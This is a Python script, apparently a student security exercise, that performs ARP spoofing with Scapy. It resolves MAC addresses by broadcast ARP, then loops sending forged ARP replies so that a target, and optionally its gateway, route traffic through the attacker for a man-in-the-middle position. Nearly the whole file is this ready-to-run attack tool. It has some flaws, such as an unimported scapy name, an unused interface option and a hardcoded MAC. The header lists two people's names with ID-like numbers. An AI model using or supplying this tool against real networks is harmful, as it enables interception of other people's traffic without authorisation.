#Zahava Brown - 557029367
#Tali Cohen - 329651871


import time
import argparse
from scapy.all import * 

# Returns the MAC address of a given IP address
def getMac(ip):
    arp = scapy.all.ARP(pdst=ip)     # Create an ARP layer object with the destination IP address set to the input IP
    ether = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")     # Create an Ethernet layer object with the destination MAC set to the broadcast address
    packet = ether/arp     # Combine the ARP and Ethernet layers to form a packet
    result = srp(packet, timeout=3, verbose=0)[0]     # Send the packet using Scapy's send-and-receive function (srp). 
                                                      # The [0] index is used to extract the list of responses from the srp function's return value. 
    if len(result) > 0:
        return result[0][1].hwsrc # Picking out the MAC address from the response packet
    return None # If no respone received, return None

# Spoofing the ARP table
def arpSpoof(victimIP, victimMAC, sourceIP, sourceMAC, flag, delay): 
    
    while True: 
        send(scapy.all.ARP(op=2, pdst=victimIP, psrc=sourceIP, hwdst=victimMAC), verbose=0) # me -> victim
                                                                            # we are telling victim that our mac is associated with source ip (often gateway)
        if flag: # continue with full duplex
            send(scapy.all.ARP(op=2, pdst=sourceIP, psrc=victimIP, hwdst=sourceMAC, hwsrc='08:00:27:b1:9d:67'), verbose = 0) #victim-> me
                                                                            # pretending to source ip that we are the victim, our mac connects to victim ip
        else: # continue with half duplex
            send(scapy.all.ARP(op=2, pdst=sourceIP, psrc=victimIP, hwdst=sourceMAC, hwsrc=victimMAC), verbose = 0) # ensuring the source knows the victim ip and mac
        time.sleep(delay) 

    

   

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="Spoof ARP tables", add_help=True) #

    parser.add_argument("-i", "--iface", help="Interface you wish to use")
    parser.add_argument("-s", "--src", help="The address you want for the attacker", type=str)
    parser.add_argument("-d", "--delay", help="Delay (in seconds) between messages", type=int)
    parser.add_argument("-gw", "--gateway", help="should GW be attacked as well", action="store_true")
    parser.add_argument("-t", "--target", help="IP of target", type=str)

    args = parser.parse_args()

    targetMac = getMac(args.target)
    sourceMac = getMac(args.src)

    delay = 2 #setting default to be 2
    if args.delay:
        delay = args.delay

    arpSpoof(args.target, targetMac, args.src, sourceMac, args.gateway, delay)

        

        



